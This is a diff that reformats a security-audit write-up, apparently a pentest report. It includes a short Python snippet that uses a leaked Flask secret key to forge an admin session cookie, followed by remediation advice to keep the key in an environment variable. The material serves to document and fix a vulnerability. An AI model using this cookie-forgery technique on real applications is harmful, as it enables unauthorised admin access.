@@ -27,13 +27,9 @@ from flask.sessions import SecureCookieSessionInterface
 
 app = Flask(__name__)
 
-app.config['SECRET_KEY'] = 'stolen-secret-key'
+app.config["SECRET_KEY"] = "stolen-secret-key"
 
-forged_payload = {
-    "admin_hardened": True,
-    "user_fname": "Admin",
-    "user_id": 1
-}
+forged_payload = {"admin_hardened": True, "user_fname": "Admin", "user_id": 1}
 
 serializer = SecureCookieSessionInterface().get_signing_serializer(app)
 forged_cookie = serializer.dumps(forged_payload)
@@ -53,7 +49,7 @@ should be stored in an environment file and imported into the app, ensuring it
 is never pushed to a central repository.
 
 ```python
-app.config['SECRET_KEY'] = os.getenv('SECRET_KEY')
+app.config["SECRET_KEY"] = os.getenv("SECRET_KEY")
 ```
 
 ## Retesting Result
